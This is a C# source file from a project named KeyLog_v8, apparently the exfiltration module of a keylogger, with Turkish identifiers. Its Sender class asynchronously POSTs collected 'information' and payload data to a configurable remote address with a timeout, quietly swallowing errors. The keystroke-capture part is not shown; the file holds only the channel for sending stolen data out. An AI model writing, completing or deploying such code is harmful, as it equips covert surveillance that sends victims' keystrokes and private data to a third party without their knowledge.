using System;
using System.Collections.Generic;
using System.Text;

using System.IO;
using System.Net;

namespace KeyLog_v8
{
    class Sender
    {
        public delegate string PostEvent(string bilgiler, string postData);
        public event PostEvent Post;

        string Adres;
        public bool IsSending;
        public int TimeOut;

        public Sender(string adres, int timeOut)
        {
            Adres = adres;
            TimeOut = timeOut;
            IsSending = false;
            this.Post += GonderPostMethod;
        }

        public void SendPost(string bilgiler, string postData)
        {
            IsSending = true;
            this.Post.BeginInvoke(bilgiler,postData,new AsyncCallback(delegate {
                IsSending = false;
            }), null);
        }

        public string GonderPostMethod(string bilgiler, string postData)
        {
            try
            {
                string buffer;
                WebRequest req = WebRequest.Create(Adres + bilgiler);

                req.Method = "POST";
                req.Timeout = TimeOut;
                req.ContentType = "application/x-www-form-urlencoded";

                byte[] byteArray;
                if(postData == null)
                    byteArray = Encoding.UTF8.GetBytes("");
                else
                    byteArray = Encoding.UTF8.GetBytes(postData);
                req.ContentLength = byteArray.Length;
                Stream dataStream = req.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Close();

                WebResponse response = req.GetResponse();
                dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);

                buffer = reader.ReadToEnd();
                reader.Close();
                dataStream.Close();
                response.Close();

                //Console.WriteLine("(POST-buffer = " + buffer + " )");
                return buffer;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + " " + ex.StackTrace);
                return null;
            }
        }
    }
}
